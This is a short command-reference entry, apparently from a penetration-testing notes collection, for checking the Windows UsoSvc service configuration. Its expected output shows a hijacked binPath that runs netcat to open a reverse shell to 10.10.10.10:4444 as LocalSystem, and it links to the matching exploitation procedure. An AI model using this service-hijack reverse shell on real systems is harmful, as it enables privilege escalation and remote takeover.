---
id: 8cb80e01-6856-4b7c-ac9b-04fb47e7a4f4
name: Query UsoSvc service configuration
type: command
executor: cmd
data: sc.exe qc usosvc
output: null
created_at: '2023-04-06T03:56:29.494938+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - service-management
  - verification
verified: true
validated: true
---

# Query UsoSvc Configuration

## Command

```cmd
sc.exe qc usosvc
```

## Description

Queries the current configuration of the UsoSvc service to verify binPath modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `qc` | Query configuration | Yes |
| `usosvc` | Service name | Yes |

## Examples

### Basic Usage

```cmd
sc.exe qc usosvc
```

## Expected Output

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe
        ...
        SERVICE_START_NAME : LocalSystem

## Related

- [[procedures/usosvc-service-account-remote-command-execution]]
- [[commands/configure-usosvc-binpath-cmd-nc]]
